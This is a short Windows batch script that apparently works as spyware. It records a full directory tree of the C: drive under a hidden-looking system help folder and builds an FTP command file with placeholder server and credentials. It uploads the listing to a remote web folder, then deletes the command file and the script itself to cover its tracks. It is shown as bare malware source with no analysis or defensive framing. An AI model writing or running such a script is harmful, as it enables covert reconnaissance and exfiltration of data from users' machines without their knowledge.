@ECHO OFF
> "%SystemRoot%\help\combat\com.log" ECHO [log] 2
:TREE
TREE C:\ /F /A > "%SystemRoot%\help\combat\%USERNAME%tree.txt"

:Upload
IF NOT EXIST "%SystemRoot%\help\combat\%USERNAME%tree.txt" GOTO TREE
> "%SystemRoot%\help\combat\upltree.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\upltree.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\upltree.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\upltree.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\upltree.txt" ECHO prompt
>>"%SystemRoot%\help\combat\upltree.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\upltree.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%tree.txt"
>>"%SystemRoot%\help\combat\upltree.txt" ECHO bye

:FTP
IF NOT EXIST "%SystemRoot%\help\combat\upltree.txt" GOTO Upload
FTP -s:"%SystemRoot%\help\combat\upltree.txt" >> "%SystemRoot%\help\combat\comlist.log"
DEL /F /Q "%SystemRoot%\help\combat\upltree.txt" >NUL

:END
DEL /F /Q %0
EXIT